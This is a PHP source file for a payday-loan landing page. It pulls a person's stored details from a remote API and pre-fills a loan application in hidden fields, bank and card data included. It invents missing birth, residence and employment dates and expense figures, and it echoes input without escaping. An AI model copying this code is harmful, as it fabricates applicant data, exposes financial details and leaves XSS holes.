<?php

	$login_key = false;
	$refresh = false;
	
	// Page functions
	function validate_ip($ip){
		if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false){
			return false;
		}
		return true;
	}	
	
	function get_ip_address() {
		$ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
		foreach($ip_keys as $key){
			if(array_key_exists($key, $_SERVER) === true){
				foreach(explode(',', $_SERVER[$key]) as $ip){
					$ip = trim($ip);
					if(validate_ip($ip)){
						return $ip;
					}
				}
			}
		}
		return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
	}		
	
	// Check for query string
	if(isset($_SERVER['QUERY_STRING'])){ $login_key = $_SERVER['QUERY_STRING']; }

	// Url contains key
	if(!isset($_SESSION)){ session_start(); }
	
	// Get username & password
	$url = "http://46.32.238.192/~vmonlineltd/api/login.php";

	$fields = array(
	   'key' => $login_key
	);

	$postvars = http_build_query($fields);
	
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);
	curl_setopt($curl, CURLOPT_HEADER, 0);

	// Send the request
	$result = curl_exec($curl);
	curl_close($curl);

	if($result[0] == "{" || $result[0] == "[")
	{
		$json = json_decode($result);
		foreach($json as $key => $value){ $_SESSION[$key] = $value; }
		
		$loan_amount = 100;
		$loan_term = 10;
		
		$loan_amount = mt_rand(100,1000);
		$loan_amount = ceil($loan_amount / 10) * 10;
		
		$loan_term = mt_rand(10, 30);
		
		if(!isset($_SESSION['dob'])){ $_SESSION['dob'] = -286901867; }
		elseif(!is_numeric($_SESSION['dob'])){ $_SESSION['dob'] = -286901867; }	
		
		// If residence_start not set, generate a random date between 2000 and 2012.
		if(!isset($_SESSION['residence_start'])){ $_SESSION['residence_start'] = mt_rand(946684800, 1325376000); }
		elseif(!is_numeric($_SESSION['residence_start'])){ $_SESSION['residence_start'] = mt_rand(946684800, 1325376000); }
		
		// If employment_start not set, generate a random date between 2000 and 2014.
		if(!isset($_SESSION['employment_start'])){ $_SESSION['employment_start'] = mt_rand(946684800, 1388534400); }
		elseif(!is_numeric($_SESSION['employment_start'])){ $_SESSION['employment_start'] = mt_rand(946684800, 1388534400); }

		// If bank_start not set, generate a random date between 2000 and 2014.
		if(!isset($_SESSION['bank_start'])){ $_SESSION['bank_start'] = mt_rand(946684800, 1388534400); }
		elseif(!is_numeric($_SESSION['bank_start'])){ $_SESSION['bank_start'] = mt_rand(946684800, 1388534400); }			
	}
	else{
		$login_key = false;
	}	
	
	
?><!doctype html>
<html class="no-js" lang="en">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Maple Tree Loans</title>
		<link rel="stylesheet" href="/css/foundation.min.css" />
		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
		<link rel="stylesheet" href="/css/slider.css" />	
		<link rel="stylesheet" href="/css/pb.css" />		
		<link rel="stylesheet" href="/css/theme.css" />
		<script src="/js/vendor/modernizr.js"></script>
	</head>
	<body>
		<div id="header">
	<div class="row">
		<div class="small-12 columns">
			<div class="logo"></div>
		</div>
	</div>
</div>

<div id="main">

	<div class="row">
		<div class="small-12 columns">
			<h1>Hey <span class="red"><?php echo $_SESSION['first_name']; ?></span>, your loan is ready to claim.</h1>
		</div>
	</div>
	
	<form name="frmApply" id="frmApply" class="register" method="post" action="#">
		<div class="row">
		
			<div class="small-12 medium-8 medium-push-4 columns">
				<div class="panel">
					<div class="row">
						<div class="small-12 columns">
							<span class="instruction">Please enter your unique reference code below:</span>
						</div>
					</div>
					<div class="row">
						<div class="show-for-medium-up medium-1 columns">&nbsp;</div>
						<div class="small-12 medium-10 columns">
							<div class="row collapse">
								<div class="small-10 columns">
									<input type="text" value="<?php echo $login_key; ?>" placeholder="3HEU8E62">
								</div>
								<div class="small-2 columns">
									<button type="submit" class="button submit postfix"><i class="fa fa-play"></i></button>
								</div>
							</div>	
							<a href="#" class="under-button" data-reveal-id="terms">Terms & Conditions</a>									
						</div>
						<div class="show-for-medium-up medium-1 columns">&nbsp;</div>
					</div>


					<!-- APPLICATION DATA -->	
					<input type="hidden" name="loan_amount" id="loan_amount" value="200" />
					<input type="hidden" name="loan_term" id="loan_term" value="30" />
					<input type="hidden" name="loan_purpose" id="loan_purpose" value="Payday" />
					<input type="hidden" name="title" id="title" value="<?php echo $_SESSION['title']; ?>" />
					<input type="hidden" name="first_name" id="first_name" value="<?php echo $_SESSION['first_name']; ?>" />
					<input type="hidden" name="last_name" id="last_name" value="<?php echo $_SESSION['last_name']; ?>" />
					<input type="hidden" name="dob" id="dob" value="<?php echo date('d-M-Y', $_SESSION['dob']); ?>" />
					<input type="hidden" name="email" id="email" value="<?php echo $_SESSION['email']; ?>" />
					<input type="hidden" name="home_phone" id="home_phone" value="<?php echo $_SESSION['home_phone']; ?>" />
					<input type="hidden" name="mobile_phone" id="mobile_phone" value="<?php echo $_SESSION['mobile_phone']; ?>" />
					<input type="hidden" name="marital_status" id="marital_status" value="<?php echo $_SESSION['marital_status']; ?>" />
					<input type="hidden" name="dependants" id="dependants" value="<?php echo $_SESSION['dependants']; ?>" />
					
					<input type="hidden" name="address_1" id="address_1" value="<?php echo $_SESSION['address_1']; ?>" />
					<input type="hidden" name="address_2" id="address_2" value="<?php echo $_SESSION['address_2']; ?>" />
					<input type="hidden" name="town" id="town" value="<?php echo $_SESSION['town']; ?>" />
					<input type="hidden" name="county" id="county" value="<?php echo $_SESSION['county']; ?>" />
					<input type="hidden" name="post_code" id="post_code" value="<?php echo $_SESSION['post_code']; ?>" />
					<input type="hidden" name="residence_status" id="residence_status" value="<?php echo $_SESSION['residence_status']; ?>" />
					<input type="hidden" name="residence_start" id="residence_start" value="<?php echo date('d-M-Y', $_SESSION['residence_start']); ?>" />
					<input type="hidden" name="income_source" id="income_source" value="<?php echo $_SESSION['income_source']; ?>" />
					<input type="hidden" name="employer_industry" id="employer_industry" value="<?php echo $_SESSION['employer_industry']; ?>" />
					<input type="hidden" name="employer_name" id="employer_name" value="<?php echo $_SESSION['employer_name']; ?>" />
					<input type="hidden" name="work_phone" id="work_phone" value="<?php echo $_SESSION['work_phone']; ?>" />
					<input type="hidden" name="employment_start" id="employment_start" value="<?php echo date('d-M-Y', $_SESSION['employment_start']); ?>" />
					<input type="hidden" name="monthly_income" id="monthly_income" value="<?php echo $_SESSION['monthly_income']; ?>" />
					<input type="hidden" name="combined_income" id="combined_income" value="<?php echo $_SESSION['combined_income']; ?>" />
					
					<input type="hidden" name="paid_direct" id="paid_direct" value="<?php echo $_SESSION['paid_direct']; ?>" />
					<input type="hidden" name="pay_frequency" id="pay_frequency" value="<?php echo $_SESSION['pay_frequency']; ?>" />
					<input type="hidden" name="next_payday" id="next_payday" value="<?php echo date('d-M-Y', strtotime('next monday')); ?>" />
					<input type="hidden" name="second_payday" id="second_payday" value="<?php echo date('d-M-Y', strtotime('next friday')); ?>" />

					<input type="hidden" name="bank_account" id="bank_account" value="<?php echo $_SESSION['bank_account']; ?>" />
					<input type="hidden" name="sort_code" id="sort_code" value="<?php echo $_SESSION['sort_code']; ?>" />
					<input type="hidden" name="debit_card" id="debit_card" value="<?php echo $_SESSION['debit_card']; ?>" />
					<input type="hidden" name="bank_name" id="bank_name" value="<?php echo $_SESSION['bank_name']; ?>" />
					<input type="hidden" name="bank_start" id="bank_start" value="<?php echo date('d-M-Y', $_SESSION['bank_start']); ?>" />
					
					<input type="hidden" name="housing_exp" id="housing_exp" value="30" />
					<input type="hidden" name="utility_exp" id="utility_exp" value="30" />
					<input type="hidden" name="food_exp" id="food_exp" value="30" />
					<input type="hidden" name="transport_exp" id="transport_exp" value="30" />
					<input type="hidden" name="credit_exp" id="credit_exp" value="30" />
					<input type="hidden" name="other_exp" id="other_exp" value="30" />
					
					<input type="hidden" id="ip" name="ip" value="<?php echo get_ip_address(); ?>"/>
					<input type="hidden" id="user_agent" name="user_agent" value="<?php echo substr($_SERVER['HTTP_USER_AGENT'],0,200); ?>"/>

					<input type="hidden" id="remarketing" name="remarketing" value="1" />
					
					<input type="hidden" name="owner" id="owner" value="MAPLE" />				
					<!-- END APPLICATION DATA -->

								
					
				</div>
			</div>
					
		
			<div class="small-12 medium-4 medium-pull-8 columns">
				<ul class="fa-ul">
					<li>CCJ's Defaults OK</li>
					<li>Fast Payout</li>
					<li>Top Broker</li>
					<li>Super Fast Application</li>
					<li>Secure Transaction</li>
					<li>98% Loan Approval</li>					
				</ul>						
			</div>
		</div>
		
	</form>
	
</div>

<div id="bottom">
	<div class="row">
		<div class="small-12 columns">
			<h4 class="red">Representative example:</h4>
			<p> Borrow £225 for 28 days. Total in one repayment £259.99. Interest   rate per annum 27.56% (fixed). Interest payable £34.99. Representative   186.6% APR. </p>
            <p> This is only a representative example, your loan offer may vary depending on what lender accepts you. </p>		
			
			<h5 class="red">Repayment Methods</h5>
			<p>The Lenders at MapleTreeLoans.co.uk accept all popular types of payment methods for when repaying your loan.</p>		

			<img src="/img/payments.png" alt="" />			
		</div>
	</div>
</div>

<div id="footer">
	<div class="row">
		<div class="small-12 columns">
			<i class="fa fa-warning"></i> <strong>Warning</strong>: Late repayment can cause you serious money problems. For help, go to moneyadviceservice.org.uk.
		</div>
	</div>
</div>

<div id="waitPopUp">
	<div class="processing">
		Your application is being processed...
	</div>
	
	<div style="width:100%;text-align:center;">
		
		<div class="meter animate red" style="width:360px;display:inline-block;">
			<span style="width: 0%"><span></span></span>
		</div>
		<!--<div id="pb_percent" style="display:inline-block;padding-left:10px;font-size:27px; font-family: 'Lato',sans-serif;color:#1d4a5a;">0%</div>-->
		<center>
		<span style="font-size:12px;">Please be patient as this process will take a few minutes.</span>
		</center>			
	</div>
</div>	

<div id="terms" class="reveal-modal tiny" data-reveal>
	<h2>Terms & Conditions.</h2>
	<div class="scrollable">
		<div>
		  <div>
		    <p>Welcome to our website www.mapletreeloans.co.uk (the "Site").</p>
		    <strong>ACCEPTANCE OF TERMS</strong> <br>
		    <br>
		    <p> By using the Website you are fully accepting the terms,   conditions   and disclaimers contained in this notice. If you do not   accept these   Terms and Conditions you must immediately stop using the   Website.  Your   access to and use of this site ("the Website") is   subject to agreement   of these Terms and Conditions. You will not use   the Website for any   purpose that is unlawful or prohibited by these   Terms and Conditions. </p>
		    <strong>CHANGES TO WEBSITE</strong> <br>
		    <br>
		    <p> We reserve the right to: </p>
		    <ul>
		      <li>Change these Terms and Conditions at any time without prior     notice, and your continued use of the Website following any changes     shall be deemed to be your agreement of any changes.</li>
		      <li>Change or remove (temporarily or permanently) the Website or   any   part of it without prior notice and you confirm that we shall not   be   liable to you for any such change or removal</li>
	        </ul>
		    <strong>OUR SERVICE</strong> <br>
		    <br>
		    <p> Maple Tree Loans are not a credit broker and therefore, we   will not provide   finance directly to you.  Our service is such that   upon completion of   your application form, we will introduce you to   lenders of finance   providers who may be able to assist with your   application for finance.    By submitting an application you will be   giving your consent for us to   match your application with one of the   Lenders or Providers on Our   panel. It is important to understand that   We will only forward your   application to a Lender or Finance Provider   that has looked at Your   application and accepted it as one they   believe there is a good chance   they can provide a loan or relevant   services to You. </p>
		    <p> Any examples of amounts available to borrow, terms (repayment     periods) or rates stated on the Lender or Provider Websites are purely     given as an example relating to the product. These examples are   stated   to provide you with an understanding of the products available.   As We do   not provide the loan or financial service directly to You We   are unable   to control the examples contained on the Website. Please   also be aware   that as we are not a lender, we have no control over any   of the decision   making in relation to your application. </p>
		    <p> The Lender/Finance Provider will carry out some checks on you   before   any decision or offer is made; this may include carrying out   credit   checks on both your current and previous history. </p>
		    <strong>LINKS TO THIRD PARTY WEBSITES</strong> <br>
		    <br>
		    <p> The Website may include links to third party websites which   are   controlled and maintained by others. Any link to other websites     available is not an endorsement of such websites and you acknowledge and     agree that we are not responsible for the content or availability of     any such sites. </p>
		    <strong>INTELLECTUAL PROPERTY RIGHTS</strong> <br>
		    <br>
		    <p> In using the Website you agree that you will access the   content   solely for your personal, non-business related use. None of   the content   may be downloaded, copied, reproduced, transmitted,   stored, sold or   distributed without the prior written consent of the   site owner. This   excludes the downloading, copying and/or printing of   pages of the   Website for personal, non-business related home use only. </p>
		    <p> All intellectual property rights, copyright or trademarks used   in the   Website and its content including without limitation the   design, text,   graphics and all software and source codes connected   with the Website   are owned by Very Merry Loans. </p>
		    <strong>LIABILITY</strong> <br>
		    <br>
		    <p> We cannot guarantee that the Lender or Finance Provider who   accepts   your application will authorise to fund your application for   finance.   This could be due to a number of reasons such as technology   problem   issues or because information provided during the application   is   incorrect.  We will not be liable for any loss that you may incur   by   using this site unless we have not acted in accordance with these   Terms   and Conditions, been negligent or otherwise required by UK law.    In the   event that You do not use this website in accordance with   these terms   and conditions or we are made aware that you are using   this form   fraudulently, We, reserve the right to claim from you any   reasonable   costs that we may incur in taking action to stop you using   the form and   recover any monies owed as a result of Your activities. </p>
		    <strong>PRIVACY AND COOKIES</strong> <br>
		    <br>
		    <p> Use of the Website is also governed by our privacy policy which is incorporated into these terms and conditions. </p>
		    <p> The Website uses cookies. Cookies are small text files that   are   created by a web server and stored on your computer when you visit   a   website. The Website uses cookies for the following purposes: to   record   analytics data. </p>
		    <p> If you wish to opt-out of our placing cookies on your   computer,   please adjust your internet browser's settings to restrict   cookies as   detailed in your internet browser's help menu. You may also   wish to   delete cookies which have already been placed. For   instructions on how   to do this, please consult your internet browser's   help menu. </p>
		    <strong>INDEMNITY</strong> <br>
		    <br>
		    <p> You agree to indemnify and hold us and our employees and   agents   innocent from and against all liabilities, legal costs, losses   and other   expenses in relation to any claims or actions brought   against us   arising out of any breach by you of these Terms and   Conditions or other   liabilities arising out of your use of this   Website. </p>
		    <strong>SEVERANCE</strong> <br>
		    <br>
		    <p> If any of these Terms and Conditions should be determined to   be   invalid, illegal or unenforceable for any reason by any court of     competent jurisdiction then such Term or Condition shall be severed and     the remaining Terms and Conditions shall survive and remain in full     force and effect and continue to be binding and enforceable. </p>
		    <strong>GOVERNING LAW</strong> <br>
		    <br>
		    <p> These Terms and Conditions shall be governed by and construed   in   accordance with the law of England and Wales and you hereby submit   to   the exclusive jurisdiction of the English courts. </p>
		    <strong>COMPLAINTS</strong> <br>
		    <br>
		    <p> We try our hardest to make every effort to ensure that the   service   you receive from this website is excellent; however, we   understand that   sometimes things may not fully work to your   expectations.  If you would   like to make a formal complaint, please   email us your concerns to   complaints@mapletreeloans.co.uk or   alternatively you can send your complaint   in writing to Maple Tree  Loans, Floor 2, 1-5 High Street, Romford, Essex, RM1 1JU. </p>
		    <p> We will aim to answer your complaint as soon as possible but     sometimes it could take a little longer to carry out our investigations     and in these instances, we will issue our final response within eight     weeks from when your first complained to us.  If for any reason we   are   unable to conclude our investigation within this time or you are   unhappy   with our final response.  You will be able to refer your   complaint to   the Financial Ombudsman Service (FOS). </p>
		    <p> The FOS will only deal with your complaint if you have   contacted us   first to be given the option to be able to put things   right for you.  So   please contact us so we can see if we can help you. </p>
		    <strong>Financial Ombudsman Service (FOS)</strong> <br>
		    <br>
		    <p> If you want the FOS to consider your complaint, you must send   your   complaint to them within 6 months of the date of our final   response.   Their contact details are: <br>
		      The Financial Ombudsman Service<br>
		      South Quay Plaza<br>
		      183 Marsh Wall<br>
		      London<br>
		      E14 9SR<br>
		      <br>
		      <br>
		      Telephone: 0300 1239 123.<br>
		      Email: complaintinfo@financial-ombudsman.org.uk<br>
		      Information regarding the service can be found on the Financial Ombudsman website:<br>
		      <a href="http://www.financial-ombudsman.org.uk/publications/consumer-leaflet.htm">http://www.financial-ombudsman.org.uk/publications/consumer-leaflet.htm</a></p>
		    <strong>INFORMATION ABOUT US</strong> <br>
		    <br>
		    <p> Maple Tree Loans is a site operated at Floor 2, 1-5 High   Street, Romford,   Essex, RM1 1JU. We are regulated by the Financial   Conduct Authority, FCA   Interim Permission Reference Number: 661905. </p>
		    <p> Last updated: 02/01/2015 </p>
	      </div>
	  </div>
		<p class="lead">&nbsp;</p>		
	</div>
	<a class="close-reveal-modal">&#215;</a>
</div>	
		<script src="/js/vendor/jquery.js"></script>
		<script src="/js/foundation.min.js"></script>
		<script src="/js/bpopup.js"></script>
		<script src="/js/slider.min.js"></script>
		<script src="/js/calc.js"></script>
		<script src="//ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
		<script src="//code.jquery.com/ui/1.10.3/jquery-ui.js"></script>
		<script src="payday_api.js"></script>	
		<script>
			$(document).foundation();
		</script>
	</body>
</html>
